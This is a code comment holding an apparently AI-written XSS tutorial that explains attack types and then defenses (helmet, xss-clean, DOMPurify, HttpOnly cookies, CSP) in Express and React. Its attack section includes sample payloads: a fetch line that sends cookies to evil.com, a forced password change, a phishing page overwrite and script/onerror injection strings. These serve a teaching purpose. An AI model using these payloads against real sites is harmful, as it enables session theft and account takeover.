/*
        ## 🧨 What does XSS do?

        **XSS (Cross-Site Scripting)** lets an attacker **run their own JavaScript in someone else’s browser**
        👉 *as if it came from your website*.

        That’s the scary part.

        ---

        ## 🧠 In simple words

        If your site shows **user input without cleaning it**, an attacker can inject JavaScript.

            That JavaScript can:

            * Read cookies 🍪
        * Steal tokens 🔐
        * Perform actions as the user
        * Change page content
        * Redirect users to fake pages

        Your backend is “safe”, but **your users are owned**.

        ---

        ## 🔥 Real example (classic XSS)

        ### ❌ Vulnerable code

            ```html
        <div class="comment">
          {{ comment.text }}
        </div>
        ```

        UserModel submits:

            ```html
        <script>alert("Hacked!")</script>
        ```

        Browser sees:

            ```html
        <div class="comment">
          <script>alert("Hacked!")</script>
        </div>
        ```

        💥 Script executes immediately.

        ---

        ## 🧪 What can the attacker actually do?

        ### 1️⃣ Steal cookies / tokens

            ```js
        fetch("https://evil.com/steal?cookie=" + document.cookie);
        ```

        If cookies aren’t `HttpOnly` → **account takeover**.

        ---

        ### 2️⃣ Act as the victim

            ```js
        fetch("/api/change-password", {
          method: "POST",
          credentials: "include",
          body: JSON.stringify({ password: "new123" })
        });
        ```

        UserModel didn’t click anything.
            Browser trusts the script.

        ---

        ### 3️⃣ Fake your UI (phishing)

            ```js
        document.body.innerHTML = `
        <h1>Session expired</h1>
        <input placeholder="Password" />
            `;
        ```

        Users type passwords → attacker wins.

        ---

        ## 🧱 Types of XSS (important)

        ### 🔴 Stored XSS (worst)

        * Malicious script saved in DB
        * Every user who views it gets hit

        Example: comments, bios, reviews

        ---

        ### 🟠 Reflected XSS

        * Script comes from URL/query
        * Triggered when victim clicks a link

        Example:

            ```
        /search?q=<script>alert(1)</script>
        ```

        ---

        ### 🟡 DOM-based XSS

        * Happens entirely in frontend JS
        * Backend never sees it

            ```js
        element.innerHTML = location.hash;
        ```

        ---

        ## 🛡️ How XSS is stopped (defense stack)

        ### 1️⃣ Escape output (most important)

        Browsers execute JS **only if it’s real JS**.

        Escaped:

            ```html
        &lt;script&gt;alert(1)&lt;/script&gt;
        ```

        Safe.

            Frameworks like React escape by default 👍

        ---

        ### 2️⃣ Input sanitization

        Remove or neutralize dangerous tags.

            Tools:

        * `xss-clean`
        * DOMPurify

        This protects storage + reuse.

        ---

        ### 3️⃣ HttpOnly cookies

            ```http
        Set-Cookie: token=abc; HttpOnly; Secure
        ```

        JS can’t read it → cookie theft blocked.

        ---

        ### 4️⃣ CSP (Content Security Policy)

        Helmet can enforce:

            ```http
        script-src 'self'
        ```

        Injected scripts won’t run 🚫

        Works great with **Helmet**.

        ---

        ## 🧠 One-liner summary

        > **XSS lets attackers run JavaScript in your users’ browsers using your website’s trust.**

        Not hacking servers.
            Hacking **people**.

        ---

        ## ⚠️ Red flag patterns (memorize)

        * `innerHTML`
        * `dangerouslySetInnerHTML`
        * Rendering raw user input
        * Storing HTML in DB
        * No output escaping

        ---
        Got you — **“HOW TO USE XSS protection”** step-by-step, **no theory**, just *do this and you’re safe* ✅

        ---

        # 🛡️ HOW TO USE XSS PROTECTION (REAL SETUP)

        We’ll cover **backend + frontend**, because XSS is a browser attack.

        ---

        ## ✅ 1️⃣ Backend (Express) — DO THIS FIRST

        ### 📦 Install

        ```bash
        npm i xss-clean helmet
        ```

        ---

        ### 🔌 Global setup (once)

        Works with **Express**

        ```ts
        import express from "express";
        import helmet from "helmet";
        import xss from "xss-clean";

        const app = express();

        app.use(express.json({ limit: "10kb" }));
        app.use(helmet());        // adds CSP + security headers
        app.use(xss());           // strips XSS payloads
        ```

        ✅ Script tags removed
        ✅ Inline JS blocked by CSP
        ✅ Covers ALL routes

        ---

        ### 🧪 Test it

        Send this payload:

        ```html
        <script>alert("xss")</script>
        ```

        Backend stores:

        ```html
        &lt;script&gt;alert("xss")&lt;/script&gt;
        ```

        🚫 Script will NOT run.

        ---

        ## ✅ 2️⃣ Validation Layer (VERY IMPORTANT)

        Sanitization alone is **not enough**.

        ```ts
        import Joi from "joi";

        export const commentSchema = Joi.object({
          text: Joi.string().trim().max(300).required()
        });
        ```

        Why?

        * Rejects unexpected structures
        * Blocks injection tricks
        * Enforces clean types

        ---

        ## ✅ 3️⃣ Frontend (React / Next.js)

        ### 🟢 SAFE by default

        React **auto-escapes** output:

        ```tsx
        <p>{comment.text}</p>
        ```

        Even if DB has:

        ```html
        <script>alert(1)</script>
        ```

        React renders text, not JS 👍

        ---

        ### 🔴 DANGEROUS (memorize this)

        ```tsx
        <div dangerouslySetInnerHTML={{ __html: comment.text }} />
        ```

        ⚠️ This **re-enables XSS**.

        ---

        ## ✅ 4️⃣ If you MUST render HTML (safe way)

        Use **DOMPurify**

        ### 📦 Install

        ```bash
        npm i dompurify
        ```

        ### 🧼 Sanitize before render

        ```ts
        import DOMPurify from "dompurify";

        const safeHTML = DOMPurify.sanitize(comment.text);
        ```

        ```tsx
        <div dangerouslySetInnerHTML={{ __html: safeHTML }} />
        ```

        ✔ Removes `<script>`
        ✔ Removes `onerror=`
        ✔ Removes inline JS

        ---

        ## ✅ 5️⃣ Cookies (critical XSS defense)

        Set cookies like this:

        ```http
        Set-Cookie: token=abc;
        HttpOnly;
        Secure;
        SameSite=Strict
        ```

        Result:

        * JS ❌ cannot read cookie
        * Even if XSS happens → **account safe**

        ---

        ## ✅ 6️⃣ Content Security Policy (CSP)

        Helmet enables CSP via headers:

        ```ts
        app.use(
          helmet.contentSecurityPolicy({
            directives: {
              defaultSrc: ["'self'"],
              scriptSrc: ["'self'"],
            },
          })
        );
        ```

        Injected scripts = 🚫 blocked at browser level.

        ---

        ## 🧠 Golden Rule (tattoo this)

        > **Never render user input as HTML unless you sanitize it first.**

        ---

        ## 🧪 Quick XSS checklist

        ✅ Backend sanitization
        ✅ Strict validation
        ✅ Escaped output
        ✅ No raw HTML rendering
        ✅ HttpOnly cookies
        ✅ CSP enabled

        If **any one** is missing → risk ⚠️

        ---

        ## ⚡ TL;DR (copy & paste safe setup)

        * `helmet()` → headers + CSP
        * `xss-clean` → strip scripts
        * Joi/Zod → validate input
        * React JSX → escaped output
        * DOMPurify → when rendering HTML

                ---
        Short answer: **yes… but that’s only *part* of what XSS protection does** 🙂
        Let me sharpen it so it’s 100% correct in your head.

        ---

        ## ✅ Are you right?

        **Yes** — XSS protection **often turns dangerous characters into safe encoded forms**
        (like HTML entities or hex)
        **BUT** that’s **not the whole story**.

        ---

        ## 🧠 What actually happens (clearly)

        There are **THREE different techniques** people mix up and call “XSS cleaning”:

        ---

        ## 1️⃣ Encoding / Escaping (what you described)

        This replaces characters with safe representations.

        Example:

        | Original | Encoded  |
        | -------- | -------- |
        | `<`      | `&lt;`   |
        | `>`      | `&gt;`   |
        | `"`      | `&quot;` |
        | `'`      | `&#x27;` |

        Input:

        ```html
        <script>alert(1)</script>
        ```

        Output:

        ```html
        &lt;script&gt;alert(1)&lt;/script&gt;
        ```

        ✅ Browser shows text
        ❌ Browser does NOT execute JS

        ➡️ **This is called OUTPUT ESCAPING**
        ➡️ Usually done by:

        * React
        * Template engines
        * `validator.escape()`

        ---

        ## 2️⃣ Sanitization (what `xss-clean` does)

        This **REMOVES or NEUTRALIZES dangerous parts**, not just encode them.

        Input:

        ```html
        <img src=x onerror=alert(1)>
        ```

        Sanitized:

        ```html
        <img src="x">
        ```

        Or sometimes:

        ```html
        ```

        (removed entirely)

        🧠 It:

        * Removes `<script>`
        * Removes `onerror`, `onclick`
        * Removes `javascript:` URLs

        This happens **BEFORE storing data**.

        ---

        ## 3️⃣ Filtering / Stripping (aggressive mode)

        Some middleware **just deletes everything unsafe**.

        Input:

        ```html
        <b>Hello</b><script>alert(1)</script>
        ```

        Result:

        ```html
        Hello
        ```

        Good for:

        * comments
        * usernames
        * bios

        Bad for:

        * rich text editors

        ---

        ## 🔥 So what does `xss-clean` ACTUALLY do?

        `xss-clean`:

        * Uses **HTML sanitization**
        * Removes dangerous tags & attributes
        * Doesn’t just hex-encode everything
        * Works on `req.body`, `req.query`, `req.params`

        👉 It does **NOT** rely only on hex encoding.

        ---

        ## ⚠️ Important correction (this is key)

        > ❌ **XSS is NOT fixed by encoding alone**

        Why?

        Because this is still dangerous:

        ```html
        <img src="x" onerror="alert(1)">
        ```

        No `<script>` tag — still XSS 💥

        That’s why **sanitization > encoding** for inputs.

        ---

        ## 🧠 Correct mental model (remember this)

        | Stage             | What to do          | Why                  |
        | ----------------- | ------------------- | -------------------- |
        | Input (backend)   | **Sanitize**        | Remove weapons       |
        | Storage (DB)      | Store clean data    | Prevent stored XSS   |
        | Output (frontend) | **Escape / Encode** | Browser safety       |
        | Browser           | CSP                 | Last line of defense |

        ---

        ## 🧩 Where hex encoding fits

        Hex / entity encoding is:

        * ✅ Great for **output**
        * ❌ Not enough for **input**
        * ❌ Dangerous if decoded later

        ---

        ## 🏁 Final one-liner

        > **XSS protection is NOT just replacing symbols — it’s removing the attacker’s ability to run JavaScript at all.**

        You were *half right* — now you’re **fully right** 😄

        ---




        */